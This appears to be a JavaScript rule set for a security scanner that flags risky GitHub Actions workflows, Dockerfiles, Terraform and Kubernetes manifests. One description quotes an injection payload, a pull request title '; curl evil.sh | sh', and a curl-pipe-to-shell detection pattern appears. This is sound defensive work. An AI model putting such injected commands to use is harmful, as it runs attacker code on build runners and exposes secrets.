// Checks for the files that build and deploy an app: GitHub Actions workflows, Dockerfiles, Terraform and Kubernetes
// YAML. Same shape as the code rules in staticRules.js, plus `kinds` (which file types the rule applies to).
// `when(line, ctx, match)` gets ctx = { i, lines, code, kind, path }.

export function infraKind(path, content = "") {
  const p = String(path).toLowerCase();
  const base = p.split("/").pop();
  if (/(^|\/)\.github\/workflows\/[^/]+\.ya?ml$/.test(p)) return "workflow";
  if (base.startsWith("dockerfile") || base.endsWith(".dockerfile"))
    return "docker";
  if (p.endsWith(".tf")) return "terraform";
  if (
    /\.ya?ml$/.test(p) &&
    /^apiVersion:/m.test(content) &&
    /^kind:\s*\w+/m.test(content)
  )
    return "k8s";
  if (/\.(sh|bash)$/.test(p)) return "shell";
  return null;
}

const UNTRUSTED_EXPR =
  /\$\{\{\s*(?:github\.event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.ref|head\.label|head\.repo\.default_branch)|comment\.body|review\.body|review_comment\.body|head_commit\.(?:message|author\.(?:name|email))|commits\[[^\]]*\]\.(?:message|author\.(?:name|email))|pages\[[^\]]*\]\.page_name|discussion\.(?:title|body))|github\.head_ref)\s*\}\}/;

const SECRET_NAME =
  /(?:PASSWORD|PASSWD|SECRET|TOKEN|API_?KEY|PRIVATE_?KEY|ACCESS_?KEY)/i;
const stripQuotes = (v) => v.trim().replace(/^["']|["']$/g, "");
const lookBack = (ctx, n) =>
  ctx.lines.slice(Math.max(0, ctx.i - n), ctx.i).join("\n");

export const INFRA_RULES = [
  // ---- GitHub Actions ----
  {
    id: "gha-pwn-request",
    title: "Workflow runs untrusted pull request code with secrets access",
    severity: "high",
    category: "CI/CD",
    cwe: "CWE-94",
    kinds: ["workflow"],
    re: /\bref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(?:sha|ref)|\bref:\s*\$\{\{\s*github\.head_ref/,
    when: (_l, ctx) => /\bpull_request_target\b/.test(ctx.code),
    description:
      "The workflow is triggered by pull_request_target (which has access to secrets and a write token) and then checks out the code from the pull request. Anyone who can open a pull request can run their own code with your secrets.",
    recommendation:
      "Use the pull_request trigger for code from forks. If pull_request_target is needed, never check out or run the pull request code in the same job.",
  },
  {
    id: "gha-script-injection",
    title: "Workflow script built from untrusted GitHub data",
    severity: "high",
    category: "CI/CD",
    cwe: "CWE-94",
    kinds: ["workflow"],
    re: UNTRUSTED_EXPR,
    // An environment variable mapping (UPPER_CASE: ${{ ... }}), if: and with: values are not shell text.
    when: (line) =>
      !/^\s*-?\s*[A-Za-z_][\w-]*:\s*\$\{\{/.test(line) || /\brun:/.test(line),
    description:
      'A value an outsider controls (issue or pull request title, branch name, commit message) is pasted straight into a script. A title like "; curl evil.sh | sh" then runs on your runner.',
    recommendation:
      'Put the value in an env: variable and read it as "$VAR" inside the script. Never write ${{ ... }} for these values inside run:.',
  },
  {
    id: "gha-write-all",
    title: "Workflow token has write access to everything",
    severity: "medium",
    category: "CI/CD",
    cwe: "CWE-250",
    kinds: ["workflow"],
    re: /^\s*permissions:\s*write-all\b/,
    description:
      "permissions: write-all gives every step in the workflow a token that can change code, releases and settings.",
    recommendation:
      "Set permissions: contents: read at the top, and grant extra permissions only to the single job that needs them.",
  },
  {
    id: "gha-unpinned-action",
    title: "Third-party action follows a moving branch",
    severity: "medium",
    category: "CI/CD",
    cwe: "CWE-829",
    kinds: ["workflow"],
    re: /\buses:\s*(?!\.\/|docker:\/\/)([\w.-]+\/[\w./-]+)@(main|master|develop|dev|latest|HEAD)\b/,
    description:
      "The action is pinned to a branch name. Whoever controls that branch can change what runs in your pipeline, including with your secrets.",
    recommendation:
      "Pin to a full commit SHA (uses: owner/repo@<40-char sha>) and let Dependabot update it.",
  },
  // ---- Shell piping, shared ----
  {
    id: "curl-pipe-shell",
    title: "Script downloaded from the internet and run directly",
    severity: "medium",
    category: "Supply Chain",
    cwe: "CWE-494",
    kinds: ["workflow", "docker", "shell"],
    re: /\b(?:curl|wget)\b[^|;&]*\|\s*(?:sudo\s+)?(?:ba|z)?sh\b/,
    description:
      "Piping a download into a shell runs whatever the server sends, with no check that it is the file you expected.",
    recommendation:
      "Download the file, verify its checksum or signature, then run it. Or install from a package manager with a pinned version.",
  },
  {
    id: "chmod-777",
    title: "Files made writable by everyone",
    severity: "medium",
    category: "Misconfiguration",
    cwe: "CWE-732",
    kinds: ["docker", "shell", "workflow"],
    re: /\bchmod\s+(?:-R\s+)?(?:0?777|a\+rwx)\b/,
    description:
      "chmod 777 lets any user or process on the machine change these files, including a compromised app.",
    recommendation:
      "Give the owner the access it needs (for example 755 for folders, 644 for files) and nothing more.",
  },

  // ---- Dockerfile ----
  {
    id: "docker-root-user",
    title: "Container runs as root",
    severity: "medium",
    category: "Container",
    cwe: "CWE-250",
    kinds: ["docker"],
    re: /^\s*FROM\s+\S+/i,
    when: (line, ctx) => {
      const lastFrom = [...ctx.lines]
        .reverse()
        .find((l) => /^\s*FROM\s/i.test(l));
      if (line !== lastFrom) return false;
      const users = ctx.code.match(/^\s*USER\s+(\S+)/gim) || [];
      const last = users.length
        ? users[users.length - 1].trim().split(/\s+/)[1]
        : "";
      return !last || /^(?:root|0)(?::.*)?$/i.test(last);
    },
    description:
      "The final image never switches to a normal user, so the app runs as root inside the container. If the app is hacked, the attacker starts with full control of the container.",
    recommendation:
      "Create a user and switch to it before the start command: RUN adduser --disabled-password app, then USER app.",
  },
  {
    id: "docker-unpinned-image",
    title: "Base image has no fixed version",
    severity: "low",
    category: "Container",
    cwe: "CWE-1104",
    kinds: ["docker"],
    re: /^\s*FROM\s+(?:--platform=\S+\s+)?([^\s:@$]+)(?::latest)?\s*(?:\s+AS\s+\S+)?\s*$/i,
    when: (_l, ctx, m) => {
      const name = m[1].toLowerCase();
      if (name === "scratch") return false;
      const earlier = lookBack(ctx, ctx.i);
      return !new RegExp(
        `\\bAS\\s+${name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\b`,
        "i",
      ).test(earlier);
    },
    description:
      "The base image uses no tag or the latest tag, so a rebuild next month can pull a different (or compromised) image than the one you tested.",
    recommendation:
      "Pin a version, for example node:20.11-alpine, or a digest (image@sha256:...).",
  },
  {
    id: "docker-secret-env",
    title: "Secret baked into the Docker image",
    severity: "high",
    category: "Secrets",
    cwe: "CWE-798",
    kinds: ["docker"],
    re: /^\s*(?:ENV|ARG)\s+([A-Za-z0-9_]+)(?:\s*=\s*|\s+)(\S.*)$/i,
    when: (_l, _c, m) => {
      if (!SECRET_NAME.test(m[1])) return false;
      const v = stripQuotes(m[2]);
      return (
        v.length >= 4 &&
        !v.includes("$") &&
        !/^(?:changeme|example|placeholder|xxx+)$/i.test(v)
      );
    },
    description:
      "A password, key or token is written into the Dockerfile. It stays in the image layers and in your repo history, and anyone who can pull the image can read it.",
    recommendation:
      "Pass secrets when the container starts (environment variables or your platform secret store). For build-time secrets use RUN --mount=type=secret.",
  },
  {
    id: "docker-copy-env",
    title: ".env file copied into the Docker image",
    severity: "high",
    category: "Secrets",
    cwe: "CWE-538",
    kinds: ["docker"],
    re: /^\s*(?:COPY|ADD)\s+(?:--\S+\s+)*\S*\.env(?:\.\w+)?\s+/i,
    when: (line) => !/\.(?:example|sample|template)\b/i.test(line),
    description:
      "The .env file, with its real passwords, is copied into the image. Every copy of the image carries them.",
    recommendation:
      "Do not copy .env files. Add them to .dockerignore and set the values as environment variables when the container runs.",
  },
  {
    id: "docker-add-remote",
    title: "Dockerfile downloads a file with ADD",
    severity: "low",
    category: "Supply Chain",
    cwe: "CWE-494",
    kinds: ["docker"],
    re: /^\s*ADD\s+(?:--\S+\s+)*https?:\/\//i,
    description:
      "ADD with a URL pulls a file at build time with no integrity check, and plain http can be tampered with on the way.",
    recommendation:
      "Use curl with https, check the SHA-256 checksum, and delete the installer afterwards.",
  },

  // ---- Terraform ----
  {
    id: "tf-open-ingress",
    title: "Firewall rule open to the whole internet",
    severity: "high",
    category: "Cloud Misconfiguration",
    cwe: "CWE-284",
    kinds: ["terraform"],
    re: /\b(?:cidr_blocks|ipv6_cidr_blocks|source_address_prefix|source_ranges)\s*=\s*(?:\[\s*)?"(?:0\.0\.0\.0\/0|::\/0|\*)"/,
    when: (_l, ctx) => {
      const near = lookBack(ctx, 8);
      const block = near.slice(near.lastIndexOf("ingress"));
      return (
        /\bingress\b|\bsource_address_prefix\b|\bsource_ranges\b/.test(near) &&
        !/\begress\b/.test(block)
      );
    },
    description:
      "A security group or firewall rule accepts traffic from any address. If the port is SSH, RDP or a database, anyone on the internet can try to connect.",
    recommendation:
      "Limit the CIDR to your own addresses or a load balancer, and only expose ports that must be public (80 and 443).",
  },
  {
    id: "tf-public-storage",
    title: "Storage bucket is public",
    severity: "high",
    category: "Cloud Misconfiguration",
    cwe: "CWE-732",
    kinds: ["terraform"],
    re: /\bacl\s*=\s*"public-read(?:-write)?"|\bblock_public_(?:acls|policy)\s*=\s*false|\brestrict_public_buckets\s*=\s*false|\bignore_public_acls\s*=\s*false/,
    description:
      "The bucket allows public reads (or writes). Anything in it can be downloaded by anyone who finds the name.",
    recommendation:
      "Keep buckets private, turn all four S3 public-access blocks on, and serve public files through a CDN with limited access.",
  },
  {
    id: "tf-public-database",
    title: "Database reachable from the internet",
    severity: "high",
    category: "Cloud Misconfiguration",
    cwe: "CWE-284",
    kinds: ["terraform"],
    re: /\bpublicly_accessible\s*=\s*true\b/,
    description:
      "The database gets a public address, so anyone can reach its login port from anywhere.",
    recommendation:
      "Set publicly_accessible = false and reach it from inside your private network (or through a bastion or VPN).",
  },
  {
    id: "tf-unencrypted",
    title: "Storage encryption turned off",
    severity: "medium",
    category: "Cloud Misconfiguration",
    cwe: "CWE-311",
    kinds: ["terraform"],
    re: /\b(?:storage_encrypted|encrypted|enable_encryption|kms_encrypted)\s*=\s*false\b/,
    description:
      "Data on this disk or database is stored unencrypted, so a leaked snapshot or backup can be read directly.",
    recommendation: "Set encryption to true (with a KMS key if you can).",
  },
  {
    id: "tf-hardcoded-secret",
    title: "Password or key written in Terraform",
    severity: "high",
    category: "Secrets",
    cwe: "CWE-798",
    kinds: ["terraform"],
    re: /^\s*(?:master_)?(?:password|secret_key|access_key|admin_password|private_key|token)\s*=\s*"([^"]{6,})"/i,
    when: (_l, _c, m) =>
      !m[1].includes("${") && !/^(?:changeme|example|placeholder)$/i.test(m[1]),
    description:
      "A real-looking secret is written in the code. It ends up in the repo history and in the Terraform state file.",
    recommendation:
      "Use a variable marked sensitive = true, or read it from a secrets manager (for example aws_secretsmanager_secret_version).",
  },
  {
    id: "tf-iam-wildcard",
    title: "Permission policy allows every action",
    severity: "medium",
    category: "Cloud Misconfiguration",
    cwe: "CWE-269",
    kinds: ["terraform"],
    re: /"Action"\s*[:=]\s*"\*"|\bactions\s*=\s*\[\s*"\*"\s*\]/,
    description:
      "The policy allows every action. If the account or role is compromised, the attacker can do anything the service can.",
    recommendation:
      'List only the actions the service needs (for example "s3:GetObject") and the exact resources.',
  },

  // ---- Kubernetes ----
  {
    id: "k8s-privileged",
    title: "Kubernetes container runs privileged",
    severity: "high",
    category: "Container",
    cwe: "CWE-250",
    kinds: ["k8s"],
    re: /^\s*privileged:\s*true\b/,
    description:
      "A privileged container has almost the same power as the host machine. A break-in to the app becomes a break-in to the node.",
    recommendation:
      "Remove privileged: true. If the container needs one capability, add only that under securityContext.capabilities.add.",
  },
  {
    id: "k8s-host-access",
    title: "Kubernetes pod shares the host network or processes",
    severity: "medium",
    category: "Container",
    cwe: "CWE-250",
    kinds: ["k8s"],
    re: /^\s*host(?:Network|PID|IPC):\s*true\b/,
    description:
      "The pod uses the host network, process list or shared memory, so it can see and reach things outside its own container.",
    recommendation:
      "Remove it unless this is a system component that truly needs it.",
  },
  {
    id: "k8s-run-as-root",
    title: "Kubernetes container allowed to run as root",
    severity: "medium",
    category: "Container",
    cwe: "CWE-250",
    kinds: ["k8s"],
    re: /^\s*(?:runAsUser:\s*0\b|runAsNonRoot:\s*false\b|allowPrivilegeEscalation:\s*true\b)/,
    description:
      "The security settings explicitly allow root or privilege escalation inside the container.",
    recommendation:
      "Set runAsNonRoot: true, allowPrivilegeEscalation: false and drop all capabilities.",
  },
  {
    id: "k8s-docker-socket",
    title: "Pod mounts the Docker socket or host filesystem",
    severity: "high",
    category: "Container",
    cwe: "CWE-250",
    kinds: ["k8s"],
    re: /^\s*path:\s*(?:\/var\/run\/docker\.sock|\/run\/containerd\/containerd\.sock|\/)\s*$/,
    when: (_l, ctx) => /hostPath:/.test(lookBack(ctx, 2)),
    description:
      "Mounting the container runtime socket or the node root folder lets the pod start other containers or read anything on the node. That is a full takeover of the machine.",
    recommendation:
      "Remove the mount. Use a build service that does not need the socket (such as Kaniko) and avoid hostPath.",
  },
  {
    id: "k8s-unpinned-image",
    title: "Kubernetes image has no fixed version",
    severity: "low",
    category: "Container",
    cwe: "CWE-1104",
    kinds: ["k8s"],
    re: /^\s*-?\s*image:\s*["']?([^\s"':@{}$]+)(?::latest)?["']?\s*$/,
    description:
      "The image uses no tag or latest, so what actually runs can change between deploys.",
    recommendation: "Pin a version tag or a digest in every image.",
  },
  {
    id: "k8s-secret-literal",
    title: "Password or token written into a Kubernetes manifest",
    severity: "high",
    category: "Secrets",
    cwe: "CWE-798",
    kinds: ["k8s"],
    re: /^\s*value:\s*["']?([^\s"'{}$]{6,})["']?\s*$/,
    when: (_l, ctx) =>
      SECRET_NAME.test(ctx.lines[ctx.i - 1] || "") &&
      /name:/.test(ctx.lines[ctx.i - 1] || ""),
    description:
      "A secret value is written directly in the manifest, which is usually committed to the repo for anyone to read.",
    recommendation:
      "Store it in a Secret (created outside git or sealed) and reference it with valueFrom: secretKeyRef.",
  },
];
